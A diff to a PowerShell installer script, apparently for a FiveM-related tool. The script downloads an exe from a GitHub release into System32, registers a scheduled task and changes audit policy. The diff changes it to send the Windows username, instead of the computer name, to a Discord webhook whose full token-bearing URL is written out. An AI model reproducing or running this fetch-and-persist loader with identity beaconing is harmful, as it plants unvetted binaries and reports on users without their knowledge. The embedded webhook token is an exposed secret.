@@ -27,6 +27,7 @@ $exeUrl        = "https://github.com/Chxtoqfee12/Fivem/releases/download/Chx_12/
 # Webhook
 $webhookUrl = "https://discord.com/api/webhooks/1424002804988514346/hfC8h7QRd0Xn-iQQTxmthRd63ikRrpOYuLdPNtmeadsyAae0j9jB4fkXTtYSs91An2u8"
 
+# ฟังก์ชันส่งข้อความไป webhook
 function Send-WebhookNotification {
     param(
         [string]$webhook,
@@ -51,15 +52,17 @@ function Send-WebhookNotification {
     }
 }
 
+# ดึงชื่อผู้ใช้ Windows ปัจจุบัน
+$userName = $env:USERNAME
+
 # -----------------------------
 # Install Mode
 # -----------------------------
 if ($choice -eq "1") {
     Write-Host "Starting installation..."
 
-    # ส่งชื่อเครื่องไป webhook ทันที
-    $computerName = $env:COMPUTERNAME
-    Send-WebhookNotification -webhook $webhookUrl -message "Install started on computer: $computerName - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    # ส่งชื่อผู้ใช้ไป webhook
+    Send-WebhookNotification -webhook $webhookUrl -message "Install started on user: $userName - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
     try {
         # ดาวน์โหลดไฟล์ exe ไปยัง System32
@@ -73,10 +76,10 @@ if ($choice -eq "1") {
         auditpol /set /subcategory:"Process Creation" /success:enable
 
         Write-Host "Installation completed."
-        Send-WebhookNotification -webhook $webhookUrl -message "Install completed successfully on computer: $computerName - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        Send-WebhookNotification -webhook $webhookUrl -message "Install completed successfully on user: $userName - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     } catch {
         Write-Warning "Installation failed: $($_.Exception.Message)"
-        Send-WebhookNotification -webhook $webhookUrl -message "Install failed on computer: $computerName - $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        Send-WebhookNotification -webhook $webhookUrl -message "Install failed on user: $userName - $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     }
 }
 
@@ -89,11 +92,10 @@ elseif ($choice -eq "2") {
         schtasks /delete /tn $taskName /f
         if (Test-Path $exeDestination) { Remove-Item $exeDestination -Force }
         Write-Host "Cleanup completed."
-        $computerName = $env:COMPUTERNAME
-        Send-WebhookNotification -webhook $webhookUrl -message "Cleanup completed on computer: $computerName - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        Send-WebhookNotification -webhook $webhookUrl -message "Cleanup completed on user: $userName - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     } catch {
         Write-Warning "Cleanup error: $($_.Exception.Message)"
-        Send-WebhookNotification -webhook $webhookUrl -message "Cleanup failed on computer: $computerName - $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        Send-WebhookNotification -webhook $webhookUrl -message "Cleanup failed on user: $userName - $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     }
 }
 
